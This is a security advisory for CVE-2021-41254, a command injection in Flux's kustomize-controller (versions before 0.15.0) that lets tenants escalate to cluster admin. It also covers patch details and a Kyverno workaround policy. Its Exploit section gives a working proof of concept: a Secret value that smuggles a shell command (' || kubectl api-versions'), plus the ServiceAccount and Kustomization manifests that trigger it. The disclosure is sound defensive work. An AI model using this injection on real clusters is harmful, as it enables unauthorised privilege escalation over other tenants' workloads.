# Privilege escalation to cluster admin on multi-tenant environments

**GHSA**: GHSA-35rf-v2jv-gfg7 | **CVE**: CVE-2021-41254 | **Severity**: high (CVSS 8.8)

**CWE**: CWE-78

**Affected Packages**:
- **github.com/fluxcd/kustomize-controller** (go): < 0.15.0

## Description

Users that can create Kubernetes Secrets, Service Accounts and Flux Kustomization objects, could execute commands inside the kustomize-controller container by embedding a shell script in a Kubernetes Secret. This can be used to run `kubectl` commands under the Service Account of kustomize-controller, thus allowing an authenticated Kubernetes user to gain cluster admin privileges.

### Impact

Multitenant environments where non-admin users have permissions to create Flux Kustomization objects are affected by this issue.

### Exploit 

To exploit the command injection, first we create a secret with a shell command:

```sh
kubectl create secret generic exploit-token --from-literal=token=" || kubectl api-versions"
```

Then we create a Service Account that refers to the above Secret:

```yaml
apiVersion: v1
kind: ServiceAccount
metadata:
  name: exploit
  namespace: default
automountServiceAccountToken: false
secrets:
- name: exploit-token
```

And finally a Kustomization that runs under the above Service Account:

```yaml
apiVersion: kustomize.toolkit.fluxcd.io/v1beta1
kind: Kustomization
metadata:
  name: exploit
  namespace: default
spec:
  interval: 5m
  path: "./deploy/"
  sourceRef:
    kind: GitRepository
    name: app
  serviceAccountName: exploit
```

When kustomize-controller reconciles the above Kustomization, it will execute the shell command from the secret.

### Patches

This vulnerability was fixed in kustomize-controller v0.15.0 (included in flux2 v0.18.0) released on 2021-10-08. Starting with v0.15, the kustomize-controller no longer executes shell commands on the container OS and the `kubectl` binary has been removed from the container image.

### Workarounds

To prevent the creation of Kubernetes Service Accounts with `secrets` in namespaces owned by tenants, a Kubernetes validation webhook such as Gatekeeper OPA or Kyverno can be used.

```yaml
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: restrict-sa
spec:
  validationFailureAction: enforce
  background: false
  rules:
    - name: validate-sa
      match:
        resources:
          kinds:
            - ServiceAccount
          namespaces:
            - tenant1
            - tenant2
        subjects:
          - kind: User
            name: some@tenant1.com
          - kind: User
            name: some@tenant2.com
          - kind: ServiceAccount
            name: kustomize-controller
            namespace: flux-system
          - kind: ServiceAccount
            name: helm-controller
            namespace: flux-system
      validate:
        message: "Invalid service account"
        pattern:
          X(secrets): "*?"
```

### References

Disclosed by ADA Logics in a security audit of the Flux project sponsored by CNCF and facilitated by OSTIF.

### For more information

If you have any questions or comments about this advisory:
* Open an issue in [kustomize-controller repository](http://github.com/fluxcd/kustomize-controller)


